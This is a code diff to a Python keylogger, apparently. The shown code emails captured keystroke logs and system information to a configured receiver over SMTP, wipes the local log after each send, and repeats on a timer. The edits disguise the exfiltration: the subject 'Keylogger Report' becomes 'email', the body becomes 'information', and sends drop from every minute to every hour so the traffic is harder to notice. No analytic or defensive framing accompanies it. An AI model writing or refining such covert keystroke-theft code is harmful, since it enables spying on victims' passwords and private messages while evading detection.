@@ -10,8 +10,8 @@ sys_info = "sys_info.txt" # text file for os info
 email_sender = "" #email that will be sending the logs
 email_pass = "" # app password from email sender gmail. (find in security settings)
 email_receiver = "" #email that will receieve the log
-subject = "Keylogger Report" #Name of the email
-body = """Attached are the keylogger logs and system information."""
+subject = "email" #Name of the email
+body = """information"""
 
 # Function to send email with the logs attached
 def send_email():
@@ -29,14 +29,13 @@ def send_email():
         with open(sys_info, "r") as logSys:
             em.add_attachment(logSys.read(), filename=sys_info)
         smtp.send_message(em)
-    with open(key_info, "w") as logKey:
+    with open(key_info, "w") as logKey: # Clear log file after sending email
         pass
 
 
-
-# Function send email every minute (change int for different times, ex: 120 for 2 minutes)
+# Function send email every hour (change int for different times, ex: 120 for 2 minutes)
 import threading, time
-def periodic_email(interval_seconds: int = 60):
+def periodic_email(interval_seconds: int = 3600):
     while True:
         send_email()
         time.sleep(interval_seconds)
